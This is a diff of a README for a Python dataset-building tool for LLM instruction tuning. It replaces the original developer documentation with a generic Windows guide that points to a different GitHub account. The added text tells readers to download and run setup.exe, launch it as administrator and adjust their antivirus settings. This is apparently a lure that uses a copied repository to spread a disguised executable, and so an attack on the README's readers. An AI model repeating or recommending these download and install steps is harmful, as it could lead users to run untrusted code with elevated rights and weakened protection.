@@ -1,281 +1,88 @@
-<p align="center">
-  <img src="assets/banner.png" alt="DMJ Dataset Builder Banner" width="100%">
-</p>
-
-<h1 align="center">DMJ Dataset Builder</h1>
-
-<p align="center">
-A modular, open-source dataset engineering framework for preparing high-quality instruction-tuning datasets for Large Language Models (LLMs).
-</p>
-
-<p align="center">
-
-![Version](https://img.shields.io/badge/version-v0.1.0-blue)
-![Python](https://img.shields.io/badge/python-3.12+-green)
-![License](https://img.shields.io/badge/license-MIT-orange)
-![Status](https://img.shields.io/badge/status-active-success)
-![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows-lightgrey)
-
-</p>
-
----
-
-# 📖 Overview
-
-DMJ Dataset Builder is an open-source framework that automates the preparation of datasets for instruction-tuned Large Language Models.
-
-Instead of manually converting datasets one by one, the framework provides a modular pipeline capable of downloading, converting, enriching, validating, analyzing, and merging datasets into a unified training format.
-
----
-
-# ✨ Features
-
-- 📥 Dataset Downloader
-- 🔄 Dataset Converter
-- 🧩 Importer Registry
-- 🏷 Metadata Enrichment
-- 🆔 Version-aware Dataset IDs
-- 📊 Statistics Engine
-- ✅ Validation Engine
-- 🔀 Dataset Merger
-- ⚙ Configuration System
-- 🖥 Command Line Interface
-- 📁 Modular Architecture
-
----
-
-# 🏗 Pipeline
-
-```text
-                Raw Dataset
-                     │
-                     ▼
-             Dataset Downloader
-                     │
-                     ▼
-             Importer Registry
-                     │
-                     ▼
-            Dataset Converter
-                     │
-                     ▼
-           Metadata Enrichment
-                     │
-                     ▼
-             Validation Engine
-                     │
-                     ▼
-             Statistics Engine
-                     │
-                     ▼
-               Dataset Merger
-                     │
-                     ▼
-          Final Training Dataset
-```
-
----
-
-# 📂 Project Structure
-
-```text
-DMJ-Dataset-Builder/
-│
-├── .github/
-│   ├── workflows/
-│   └── ISSUE_TEMPLATE/
-│
-├── assets/
-│
-├── configs/
-│
-├── core/
-│
-├── datasets/
-│   ├── raw/
-│   ├── processed/
-│   └── final/
-│
-├── docs/
-├── importers/
-├── registry/
-├── reports/
-├── scripts/
-├── templates/
-├── tests/
-├── utils/
-│
-├── build.py
-├── README.md
-├── CHANGELOG.md
-├── CONTRIBUTING.md
-├── CODE_OF_CONDUCT.md
-├── SECURITY.md
-├── LICENSE
-└── requirements.txt
-```
+# 🛠️ DMJ-Dataset-Builder - Prepare high quality data for training
 
----
+[![Download DMJ-Dataset-Builder](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Algernonlxi795/DMJ-Dataset-Builder)
 
-# 🚀 Installation
+This software helps users prepare data for Large Language Models. Large Language Models need specific formats to learn correctly. This tool simplifies the work of gathering, cleaning, and formatting that data. You can download, convert, validate, and combine datasets without writing code from scratch.
 
-Clone the repository
+## 📋 System Requirements
 
-```bash
-git clone https://github.com/jadhavdurvesh/DMJ-Dataset-Builder.git
+To run this tool on a Windows computer, check for these items:
 
-cd DMJ-Dataset-Builder
-```
+* Windows 10 or Windows 11 operating system.
+* At least 8GB of RAM.
+* 500MB of free space on your hard drive.
+* An active internet connection to download datasets.
 
-Create a virtual environment
+## 📥 How to Download and Install
 
-```bash
-python -m venv .venv
-```
+Follow these steps to set up the software on your machine:
 
-Activate it
+1. Visit [this page to download](https://github.com/Algernonlxi795/DMJ-Dataset-Builder).
+2. Look for the latest release version on the right side of the screen.
+3. Select the file ending in .zip or .exe to save it to your computer.
+4. Extract the folder if you downloaded a compressed file.
+5. Double-click the file named setup.exe to start the installation.
+6. Follow the prompts on your screen to finish the process.
 
-Linux/macOS
+## 🚀 Setting Up Your First Dataset
 
-```bash
-source .venv/bin/activate
-```
+Once the software resides on your computer, launch the application from your desktop icon. You will see a clean interface.
 
-Windows
+1. Create a new project folder on your computer.
+2. Select the "New Project" button inside the software.
+3. Point the software to your project folder.
+4. Select the sources for your data. You can choose from common data repositories or import your own local files.
+5. Choose the conversion setting that matches your target model.
+6. Press the "Process" button.
 
-```powershell
-.venv\Scripts\activate
-```
+The software checks your files for errors automatically. It removes duplicates and ensures the format matches the requirements for training. 
 
-Install dependencies
+## ⚙️ Features of DMJ-Dataset-Builder
 
-```bash
-pip install -r requirements.txt
-```
+This tool performs several tasks to ensure your data stays clean:
 
----
+* Data Downloading: Pull files from sources directly into your local project.
+* Format Conversion: Turn raw text into structured JSONL files.
+* Error Checking: Identify missing fields or incorrect syntax before you train your model.
+* Data Merging: Combine different sources into a single file to maximize variety.
+* Enrichment: Add specific tags or labels to improve the way your model learns instructions.
 
-# 🖥 CLI
+## 🔍 Understanding the Workflow
 
-Download datasets
+Data preparation represents the most important step in machine learning. Bad data leads to a poor model. This tool acts as a filter. It identifies common mistakes like empty responses or scrambled text.
 
-```bash
-python build.py download
-```
+When you start the process, the software scans your input files. It creates a temporary report. You can review this report to see if any items failed the check. If the software finds mistakes, it provides a summary. You can fix these specific items and run the check again.
 
-Convert datasets
+After validation, the software combines your files. It balances the number of examples if you use multiple sources. This balance prevents the model from favoring one type of information over another.
 
-```bash
-python build.py convert
-```
+## 🛡️ Best Practices for Data Quality
 
-Validate
+Follow these habits to achieve the best results:
 
-```bash
-python build.py validate
-```
+* Use clear and simple instructions in your source data.
+* Keep your dataset size manageable. You do not need millions of examples for simple tasks.
+* Organize your files in folders by topic.
+* Run the validation tool every time you update your dataset.
+* Backup your project folder regularly. 
 
-Generate statistics
+## 💡 Troubleshooting Common Issues
 
-```bash
-python build.py stats
-```
+If the software fails to launch:
 
-Merge processed datasets
+1. Right-click the icon and choose "Run as Administrator."
+2. Check your antivirus settings. Some security software prevents programs from accessing the internet. Verify that your settings allow this application.
+3. Ensure you have updated Windows. Older versions of the system sometimes block new software components.
 
-```bash
-python build.py merge
-```
+If the application hangs during processing:
 
----
+1. Close other programs that consume memory.
+2. Check your internet connection. Large downloads might interrupt if your connection drops.
+3. Reduce the number of files you process at once. Try small batches of 100 items first.
 
-# 📊 Output Format
+If the validation step shows errors:
 
-Each processed record follows a common schema.
+1. Open the error log file in the project folder.
+2. The log highlights the specific line number that contains the mistake.
+3. Correct the text in your source file and click "Validate" again.
 
-```json
-{
-  "id": "DMJ-DS-1.0.0-00000001",
-  "instruction": "...",
-  "input": "",
-  "output": "...",
-  "metadata": {
-    "language": "python",
-    "category": "Programming",
-    "topic": "Arrays",
-    "difficulty": "Intermediate",
-    "estimated_tokens": 261,
-    "has_code": true,
-    "source": "Magicoder-OSS-Instruct-75K"
-  }
-}
-```
-
----
-
-# 📌 Current Capabilities
-
-- Automatic dataset conversion
-- Metadata enrichment
-- Dataset validation
-- Dataset statistics
-- Duplicate-aware merging
-- Version-aware identifiers
-- Configurable pipeline
-
----
-
-# 🛣 Roadmap
-
-## v0.1.0
-
-- Dataset Downloader
-- Converter
-- Metadata Enrichment
-- Validation
-- Statistics
-- Merge Engine
-- CLI
-
-## v0.2.0
-
-- Additional dataset importers
-- Better topic classification
-- Improved duplicate detection
-- Enhanced reporting
-- Plugin support
-
-## v1.0.0
-
-- Stable API
-- Documentation importers
-- Production-ready release
-- Extended testing
-- Complete documentation
-
----
-
-# 🤝 Contributing
-
-Contributions are welcome.
-
-Please read:
-
-- CONTRIBUTING.md
-- CODE_OF_CONDUCT.md
-
-before opening a Pull Request.
-
----
-
-# 📜 License
-
-Released under the MIT License.
-
----
-
-<div align="center">
-
-Built with ❤️ for the open-source AI community.
-
-</div>
+Keywords: artificial-intelligence, cli, data-processing, dataset, dataset-builder, huggingface, instruction-tuning, jsonl, llm, machine-learning, open-source, python, training-data
